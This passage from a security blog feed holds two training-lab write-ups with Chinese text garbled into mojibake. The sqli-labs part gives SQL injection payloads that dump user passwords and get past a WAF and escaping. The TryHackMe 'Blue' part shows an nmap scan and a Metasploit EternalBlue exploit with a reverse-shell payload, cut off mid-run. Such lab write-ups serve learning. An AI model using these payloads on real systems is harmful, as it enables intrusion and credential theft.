src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118200656209.png" class><h2 id="0x14-Less-30-GET-åŸºäºbool-ç»•è¿‡WAF"><a href="#0x14-Less-30-GET-åŸºäºbool-ç»•è¿‡WAF" class="headerlink" title="0x14.Less-30 GET åŸºäºbool ç»•è¿‡WAF"></a>0x14.Less-30 GET åŸºäºbool ç»•è¿‡WAF</h2><p><code>è·Ÿä¸Šé¢˜ä¸€æ ·</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot; union select 1,group_concat(username,0x7e,password),3 from users where&quot;1=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118201045806.png" class><h2 id="0x15-Less-31-GET-åŸºäºbool-ç»•è¿‡WAF"><a href="#0x15-Less-31-GET-åŸºäºbool-ç»•è¿‡WAF" class="headerlink" title="0x15.Less-31 GET åŸºäºbool ç»•è¿‡WAF"></a>0x15.Less-31 GET åŸºäºbool ç»•è¿‡WAF</h2><p><code>è·Ÿä¸Šé¢˜ä¸€æ ·</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot;) union select 1,group_concat(username,0x7e,password),3 from users where(&quot;1=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118201428847.png" class><blockquote><p>è¿™ä¸‰é“é¢˜å¾ˆå¥‡æ€ªï¼Œè¯´æ˜¯æœ‰wafä½†æ˜¯å•¥ä¹Ÿæ²¡æœ‰ã€‚ç»•è¿‡wafå‚è€ƒä»¥ä¸‹æ–‡ç« </p></blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L256amRzZHMvYXJ0aWNsZS9kZXRhaWxzLzc3NzU4ODI0">å‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p><p><code>ç¬¬ä¸€ä¸ªidå‚æ•°ç”¨äºæ¬ºéª—wafï¼Œç¬¬äºŒä¸ªä¸ºçœŸå®æŸ¥è¯¢</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=0&quot;) -- -</span><br><span class="line">?id=1&amp;id=1&quot;) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118202113371.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118202142173.png" class><h2 id="0x16-Less-32-GET-ç»•è¿‡è½¬ä¹‰å­—ç¬¦"><a href="#0x16-Less-32-GET-ç»•è¿‡è½¬ä¹‰å­—ç¬¦" class="headerlink" title="0x16.Less-32 GET ç»•è¿‡è½¬ä¹‰å­—ç¬¦\"></a>0x16.Less-32 GET ç»•è¿‡è½¬ä¹‰å­—ç¬¦\</h2><p><code>è¿™é‡Œå†™å¼•å·ä¼šè¢«åŠ ä¸Š\è¿›è¡Œè½¬ä¹‰</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118212716561.png" class><p><code>å¯ä»¥ä½¿ç”¨å®½å­—èŠ‚è¿›è¡Œç»•è¿‡ï¼Œæ±‰å­—ä½ çš„urlç¼–ç ä¸º%e4%bd%a0ï¼Œè¿™é‡Œæå–%e4ä¸\è¿›è¡Œæ‹¼æ¥ï¼Œä½†æ˜¯ä»–å¹¶ä¸æ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œå°±å¯ä»¥ç»•è¿‡\</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118215012643.png" class><p><code>è€æ–¹æ³•ï¼Œç›´æ¥æŸ¥è¯¢</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118220631992.png" class><p><code>çˆ†å­—æ®µ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=users -- -</span><br></pre></td></tr></table></figure><p><code>ä½†æ˜¯è¿™é‡Œå‡ºç°äº†ä¸ªé—®é¢˜ï¼Œè¯´æ˜¯æ²¡æœ‰usersè§äº†é¬¼äº†ï¼Œä¸Šé¢æ˜æ˜æŸ¥å‡ºæ¥äº†å‘€</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118220853724.png" class><p><code>è¿™é‡Œå‘ç°usersè¢«åŠ ä¸Šäº†å•å¼•å·ï¼Œå¦‚ä½•é€ƒè„±è¿™ç§æŸç¼šå‘¢ï¼Œå°†usersè½¬ä¸º16è¿›åˆ¶ç¼–ç å³å¯</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118221744344.png" class><p><code>çˆ†æ•°æ®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,group_concat(username,0x7e,password),3 from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118222615247.png" class><h2 id="0x17-Less-33-GET-ç»•è¿‡è½¬ä¹‰å­—ç¬¦"><a href="#0x17-Less-33-GET-ç»•è¿‡è½¬ä¹‰å­—ç¬¦" class="headerlink" title="0x17.Less-33 GET ç»•è¿‡è½¬ä¹‰å­—ç¬¦\"></a>0x17.Less-33 GET ç»•è¿‡è½¬ä¹‰å­—ç¬¦\</h2><p><code>è·Ÿä¸Šä¸€é“é¢˜ä¸€æ¯›ä¸€æ ·ï¼Œæ€ªäº‹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,group_concat(username,0x7e,password),3 from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118222957733.png" class><h2 id="0x18-Less-34-POST-ç»•è¿‡è½¬ä¹‰å­—ç¬¦"><a href="#0x18-Less-34-POST-ç»•è¿‡è½¬ä¹‰å­—ç¬¦" class="headerlink" title="0x18.Less-34 POST ç»•è¿‡è½¬ä¹‰å­—ç¬¦\"></a>0x18.Less-34 POST ç»•è¿‡è½¬ä¹‰å­—ç¬¦\</h2><p><code>åŒä¸Šä¸€é¢˜ï¼Œåªæ˜¯å­—æ®µæœ‰2ä¸¤ä¸ª</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1%e4&#x27; order by 3 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119101637618.png" class><p><code>å…¶ä»–è¿‡ç¨‹åŒä¸Š</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=0%e4&#x27; union select 1,group_concat(username,0x7e,password) from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119101747730.png" class><h2 id="0x19-Less-35-GET-ç»•è¿‡-ï¼ˆä¸éœ€è¦ï¼‰"><a href="#0x19-Less-35-GET-ç»•è¿‡-ï¼ˆä¸éœ€è¦ï¼‰" class="headerlink" title="0x19.Less-35 GET ç»•è¿‡\ï¼ˆä¸éœ€è¦ï¼‰"></a>0x19.Less-35 GET ç»•è¿‡\ï¼ˆä¸éœ€è¦ï¼‰</h2><p><code>è¿™é¢˜é†‰äº†ï¼Œè¯´æ˜¯ç»•è¿‡\ï¼Œä½†æ˜¯æ²¡æœ‰é—­åˆå­—ç¬¦ï¼ŒğŸ˜‚</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0 union select 1,group_concat(username,0x7e,password),3 from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119103112599.png" class><h2 id="0x20-Less-36-GET-ç»•è¿‡Mysql-real-escape-string"><a href="#0x20-Less-36-GET-ç»•è¿‡Mysql-real-escape-string" class="headerlink" title="0x20.Less-36 GET ç»•è¿‡Mysql_real_escape_string"></a>0x20.Less-36 GET ç»•è¿‡Mysql_real_escape_string</h2><blockquote><p> æŸ¥çœ‹æºç å‘ç°ï¼Œå‚æ•°ä¼šè¢«mysql_real_escape_stringè½¬ä¹‰</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span>(<span class="params">$string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= mysql_real_escape_string($string);    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å®šä¹‰å’Œç”¨æ³•</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql_real_escape_string() å‡½æ•°è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚</span><br><span class="line"></span><br><span class="line">ä¸‹åˆ—å­—ç¬¦å—å½±å“ï¼š</span><br><span class="line"></span><br><span class="line"> \x00</span><br><span class="line"> \n</span><br><span class="line"> \r</span><br><span class="line"> \</span><br><span class="line"> &#x27;</span><br><span class="line"> &quot;</span><br><span class="line"> \x1a</span><br><span class="line"></span><br><span class="line">å¦‚æœæˆåŠŸï¼Œåˆ™è¯¥å‡½æ•°è¿”å›è¢«è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> è¯­æ³•</span></span><br><span class="line"></span><br><span class="line">mysql_real_escape_string(string,connection)</span><br><span class="line"></span><br><span class="line">| å‚æ•°       | æè¿°                                                  |</span><br><span class="line">| :--------- | :---------------------------------------------------- |</span><br><span class="line">| string     | å¿…éœ€ã€‚è§„å®šè¦è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚                            |</span><br><span class="line">| connection | å¯é€‰ã€‚è§„å®š MySQL è¿æ¥ã€‚å¦‚æœæœªè§„å®šï¼Œåˆ™ä½¿ç”¨ä¸Šä¸€ä¸ªè¿æ¥ã€‚ |</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> è¯´æ˜</span></span><br></pre></td></tr></table></figure><p>æœ¬å‡½æ•°å°† <em>string</em> ä¸­çš„ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ï¼Œå¹¶è€ƒè™‘åˆ°è¿æ¥çš„å½“å‰å­—ç¬¦é›†ï¼Œå› æ­¤å¯ä»¥å®‰å…¨ç”¨äº <span class="exturl" data-url="aHR0cHM6Ly93d3cudzNzY2hvb2wuY29tLmNuL3BocC9mdW5jX215c3FsX3F1ZXJ5LmFzcA==">mysql_query()<i class="fa fa-external-link-alt"></i></span>ã€‚</p><p><code>æµ‹è¯•é—­åˆå­—ç¬¦ï¼Œç»“æœä¸ºå•å¼•å·</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1%e4&#x27; and 1=1 -- -</span><br><span class="line">?id=1%e4&#x27; and 1=2 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119103932605.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119104044212.png" class><p><code>å…¶ä»–è¿‡ç¨‹åŒä¸Š</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,group_concat(username,0x7e,password),3 from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119103818736.png" class><h2 id="0x21-Less-37-POST-ç»•è¿‡Mysql-real-escape-string"><a href="#0x21-Less-37-POST-ç»•è¿‡Mysql-real-escape-string" class="headerlink" title="0x21.Less-37 POST ç»•è¿‡Mysql_real_escape_string"></a>0x21.Less-37 POST ç»•è¿‡Mysql_real_escape_string</h2><p><code>ä¸ä¸Šä¸€é¢˜ä¸€æ ·</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname = mysql_real_escape_string($uname1);</span><br><span class="line">$passwd= mysql_real_escape_string($passwd1);</span><br></pre></td></tr></table></figure><p><code>æŒ‰ç…§ä¸Šä¸€é¢˜çš„æ–¹æ³•ï¼Œä½†æ˜¯ç»“æœå¹¶ä¸æ˜¯æˆ‘æƒ³è±¡çš„é‚£æ ·ï¼Œé—­åˆå­—ç¬¦æ€ä¹ˆä¹Ÿæ‰¾ä¸åˆ°ï¼Œäºæ˜¯æŠ“åŒ…å‘ç°%ä¼šè¢«ç¼–ç ä¸º%25</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119111554948.png" class><p><code>æ‰€ä»¥å¯ä»¥å°†%25æ¢ä¸º%</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119111930781.png" class><p><code>å…¶ä»–è¿‡ç¨‹åŒä¸Š</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%e4%27 union select 1,group_concat(username,0x7e,password) from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119112040350.png" class>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;Sqli_labs_Page2(advance)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;strong&gt;skip:åŸºç¡€ç¯‡ç¯å¢ƒä¸ºwindowsï¼Œä½†åœ¨æé«˜ç¯‡æœ‰äº›å…³å¡ä¼šå‡ºç°è§£æé”™è¯¯ï¼Œæœ¬ç¯‡ä½¿ç”¨dockeræ­å»ºçš„Linuxç¯å¢ƒ&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Sqli-labs" scheme="https://lunamoore.github.io/categories/Sqli-labs/"/>
    
    
    <category term="Sqli-labs" scheme="https://lunamoore.github.io/tags/Sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>tryhackme-[blue]</title>
    <link href="https://lunamoore.github.io/2021/01/15/tryhackme-blue/"/>
    <id>https://lunamoore.github.io/2021/01/15/tryhackme-blue/</id>
    <published>2021-01-15T11:53:54.000Z</published>
    <updated>2021-01-15T11:56:55.030Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Demo"><a href="#0x01-Demo" class="headerlink" title="0x01.Demo"></a>0x01.Demo</h2><img src="/2021/01/15/tryhackme-blue/image-20210115194912000.png" class><a id="more"></a><h2 id="0x02-ä¿¡æ¯æ”¶é›†"><a href="#0x02-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x02.ä¿¡æ¯æ”¶é›†"></a>0x02.ä¿¡æ¯æ”¶é›†</h2><p><code>çœ‹åˆ°äº†ms17-010(æ°¸æ’ä¹‹è“)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/blue# nmap -sC -vv --script=vuln 10.10.246.255 -oN nmap.demo</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-15 05:38 EST</span><br><span class="line">NSE: Loaded 105 scripts for scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:38</span><br><span class="line">Completed NSE at 05:38, 10.00s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:38</span><br><span class="line">Completed NSE at 05:38, 0.00s elapsed</span><br><span class="line">Initiating Ping Scan at 05:38</span><br><span class="line">Scanning 10.10.246.255 [4 ports]</span><br><span class="line">Completed Ping Scan at 05:38, 0.30s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 05:38</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 05:38, 0.02s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 05:38</span><br><span class="line">Scanning 10.10.246.255 [1000 ports]</span><br><span class="line">Discovered open port 445/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 3389/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 139/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 135/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49154/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49159/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49153/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49158/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49152/tcp on 10.10.246.255</span><br><span class="line">Completed SYN Stealth Scan at 05:39, 46.22s elapsed (1000 total ports)</span><br><span class="line">NSE: Script scanning 10.10.246.255.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:39</span><br><span class="line">NSE: [ssl-ccs-injection 10.10.246.255:3389] No response from server: ERROR</span><br><span class="line">NSE Timing: About 88.47% done; ETC: 05:39 (0:00:04 remaining)</span><br><span class="line">NSE Timing: About 89.08% done; ETC: 05:40 (0:00:07 remaining)</span><br><span class="line">Completed NSE at 05:40, 90.23s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:40</span><br><span class="line">Completed NSE at 05:40, 0.00s elapsed</span><br><span class="line">Nmap scan report for 10.10.246.255</span><br><span class="line">Host is up, received echo-reply ttl 127 (0.25s latency).</span><br><span class="line">Scanned at 2021-01-15 05:38:32 EST for 136s</span><br><span class="line">Not shown: 991 closed ports</span><br><span class="line">Reason: 991 resets</span><br><span class="line">PORT      STATE SERVICE       REASON</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127</span><br><span class="line">445/tcp   open  microsoft-ds  syn-ack ttl 127</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127</span><br><span class="line">|_ssl-ccs-injection: No reply from server (TIMEOUT)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">49152/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49153/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49154/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49158/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49159/tcp open  unknown       syn-ack ttl 127</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED</span><br><span class="line">|_smb-vuln-ms10-054: false</span><br><span class="line">|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk factor: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists in Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:40</span><br><span class="line">Completed NSE at 05:40, 0.00s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:40</span><br><span class="line">Completed NSE at 05:40, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 147.23 seconds</span><br><span class="line">           Raw packets sent: 1189 (52.292KB) | Rcvd: 1066 (42.672KB)</span><br><span class="line">root@JIYE:~/tryhackme/blue#</span><br></pre></td></tr></table></figure><h2 id="0x03-MSFç›´æ¥åˆ©ç”¨"><a href="#0x03-MSFç›´æ¥åˆ©ç”¨" class="headerlink" title="0x03.MSFç›´æ¥åˆ©ç”¨"></a>0x03.MSFç›´æ¥åˆ©ç”¨</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 10.10.246.255</span><br><span class="line">rhosts =&gt; 10.10.246.255</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost 10.9.248.83</span><br><span class="line">lhost =&gt; 10.9.248.83</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS         10.10.246.255    yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain      .                no        (Optional) The Windows domain to use for authentication</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.9.248.83      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.9.248.83:4444 </span><br><span class="line">[*] 10.10.246.255:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 10.10.246.255:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.10.246.255:445     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] 10.10.246.255:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 10.10.246.255:445 - Connection established for exploitation.</span><br><span class="line">[+] 10.10.246.255:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 10.10.246.255:445 - CORE raw buffer dump (42 bytes)</span><br><span class="line">[*] 10.10.246.255:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 10.10.246.255:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br><span class="line">[*] 10.10.246.255:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br><span class="line">[+] 10.10.246.255:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 10.10.246.255:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 10.10.246.255:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 10.10.246.255:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 10.10.246.255:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 10.10.246.255:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 10.10.246.255:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 10.10.246.255:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 10.10.246.255:445 - Receiving response from exploit packet</span><br><span class="line">[+] 10.10.246.255:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 10.10.246.255:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 